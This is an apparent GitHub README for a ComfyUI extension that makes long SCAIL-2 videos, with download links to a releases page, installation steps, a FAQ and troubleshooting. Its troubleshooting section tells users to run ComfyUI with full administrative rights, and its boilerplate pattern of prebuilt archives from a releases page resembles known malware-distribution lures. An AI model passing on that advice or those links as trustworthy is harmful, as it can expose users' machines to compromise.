# 🎞️ scail-auto-extend - Create long videos with simple tools

[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/ioanadelirious841/scail-auto-extend/releases)

## 📌 About this project

The scail-auto-extend project adds new capabilities to ComfyUI. It helps you create SCAIL-2 videos of any length without manual work. The software handles technical tasks like chunking, anchoring, color matching, and stitching for you. This allows you to focus on your creative output while the system manages the video assembly process.

## ⚙️ System requirements

To run this software, ensure your computer meets these conditions:

* Operating System: Windows 10 or Windows 11.
* Graphics Card: NVIDIA GPU with at least 8GB of video memory.
* Memory: 16GB of system RAM.
* Storage: 5GB of free space.
* Software: A working installation of ComfyUI.

## 📥 How to download

Visit the official release page to download the latest version of the software.

[Download the latest release here](https://github.com/ioanadelirious841/scail-auto-extend/releases)

## 🛠️ Step-by-step installation

Follow these steps to install the extension into your existing ComfyUI setup:

1. Download the archive file from the link provided above.
2. Locate your ComfyUI installation folder on your computer.
3. Open the folder named custom_nodes inside the ComfyUI directory.
4. Extract the contents of the downloaded archive into this custom_nodes folder.
5. Restart your ComfyUI application to allow it to recognize the new files.

## 🚀 Using the extension

Once installed, the new nodes appear in your node menu. Use the drag-and-drop workflow system to link them.

* Input: Load your base video source into the first node.
* Settings: Adjust the length and chunking parameters in the settings panel.
* Color Match: Use this toggle to ensure consistent tones across chunks.
* Anchor: Select the anchor points to keep your video stable.
* Process: Click the queue button to start the rendering process.

The system performs the heavy lifting by breaking your prompt into manageable segments. It stitches these segments back together into one file upon completion.

## 🔍 Understanding the features

Automatic chunking manages the frame counts for you. It prevents the common errors associated with long video generation. The anchoring feature keeps your subjects in focus throughout the transition phases. Color matching provides a smooth look between segments. You do not need to perform manual fixes in external video editors.

## ❓ Frequently asked questions

What does it mean to chunk a video?
Chunking is the process of breaking a long video into smaller, manageable parts that the computer can process without crashing.

Why do I need a strong graphics card?
The software performs complex image math. A powerful graphics card handles these calculations significantly faster than a standard computer processor.

Does this work with other AI models?
Yes, this extension works with most standard ComfyUI models. Ensure your models support the SCAIL-2 format for the best results.

What if the video stitching fails?
Check your memory usage. If your system runs out of memory, try reducing the number of frames per chunk in the node settings.

## 🔧 Troubleshooting common issues

If you encounter errors, verify these points:

* Path issues: Ensure your folder names do not contain special characters or symbols.
* Permission issues: Run your ComfyUI environment with full administrative rights.
* Outdated drivers: Update your NVIDIA graphics card drivers to the most recent version available from the manufacturer website.
* Corrupt downloads: If the software does not load, delete the folder and perform a fresh download.

## 📈 Performance tips

Keep your workspace clean. Delete unused nodes to reduce load times. Close background applications that consume memory while running large tasks. Use solid state drives for storage to improve read and write speeds. Monitoring your GPU temperature helps you understand how hard your system works during long renders. Consider rendering during low-traffic times to preserve your machine's responsiveness for other tasks. 

If you find that your video looks jumpy, adjust the overlap settings within the node. The overlap helps the software understand how the end of one chunk should blend into the start of the next one. Increasing the overlap value creates better transitions but adds to the total processing time. Experiment with these values to find the right balance for your specific video project.